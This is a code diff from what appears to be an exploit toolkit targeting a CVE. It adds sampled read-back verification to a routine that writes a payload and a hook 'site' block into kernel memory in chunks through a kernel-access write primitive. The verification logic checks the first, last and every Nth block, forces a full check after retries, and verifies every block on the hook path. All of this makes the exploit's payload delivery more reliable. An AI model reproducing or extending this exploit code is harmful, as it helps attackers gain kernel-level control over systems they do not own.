@@ -176,6 +176,8 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         body.offset = plan.payload_file_offset;
         body.width = request.width;
         body.channel = request.channel;
+        /* 钩子路径自己选全查：载荷不大，而站点写绝不能跟在一个没验过的 landing 后面。 */
+        body.verify_every = 0U;
         if (!write_image_verified(body, refusal)) {
             /* 载荷没写完 ⇒ 站点块从未被写，分支没有生效，拒绝名沿用载荷那一段（step-write-refused /
              * step-verify-failed）。 */
@@ -343,6 +345,8 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             return false;
         }
         const std::size_t blocks = (request.image.size() + request.width - 1U) / request.width;
+        /* 抽样状态：一次失败尝试之后，下一块无论步长都回读（判据的一部分，不是额外策略）。 */
+        bool force_verify = false;
         for (std::size_t block = 0U; block < blocks; ++block) {
             const std::size_t at = block * request.width;
             const std::size_t take = request.image.size() - at < request.width ?
@@ -352,6 +356,14 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             std::memcpy(in, request.image.data() + at, take);
             request.params->offset = request.offset + at;
             request.params->offset_set = true;
+            /* 回读抽样（判据三条）：首块、每 N 块、最后一块一定查；任何失败尝试后的下一块一定查。
+             * 步长来自调用方（request.verify_every；0 = 每块都查），本层不自行决定。 */
+            const bool last_block = (block + 1U == blocks);
+            const bool sampled_out =
+                request.verify_every != 0U && !last_block &&
+                (static_cast<std::uint64_t>(block) % request.verify_every) != 0U;
+            const bool verify = force_verify || !sampled_out;
+            force_verify = false;
             /* 每块的事实（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/chain.cpp:215-250
              *  —— 那边逐块：offset = region.offset + b*16、长度 = kChainBlockBytes、写 16 字节；
              *  patch #1 的同款循环在 steps/crash_dump.cpp:40-50；
@@ -367,6 +379,13 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                               ghostlock::contract::KernelAccess::status_name(written.status));
                 *refusal = message;
                 return false;
+            }
+            if (!verify) {
+                /* 抽样掉的那一块：不回读；整段仍会在任何一次回读不符时失败（失败即整段失败）。 */
+                GL_LOGI("block[%zu]: verify skipped stride=%llu off=%llu",
+                        block, static_cast<unsigned long long>(request.verify_every),
+                        static_cast<unsigned long long>(request.offset + at));
+                continue;
             }
             /* 写是派发式的（成功只到 Dispatched）：落盘要等内核处理，所以这里做**有界重试**。
              * 耐心由调用方给（request.budget_ms；0 = 不重试，与旧行为一致）—— 等多久是上层的事。 */
@@ -420,6 +439,8 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                         std::chrono::steady_clock::now() - block_start).count();
                     GL_LOGI("block[%zu]: landed tries=%zu took=%lld us", at, tries,
                             static_cast<long long>(block_us));
+                    /* 这一块重试过 ⇒ 下一块不再抽样，直接全查。 */
+                    force_verify = tries > 1U;
                     break;  /* landed：预算内比中 */
                 }
                 if (std::chrono::steady_clock::now() >= verify_deadline) {
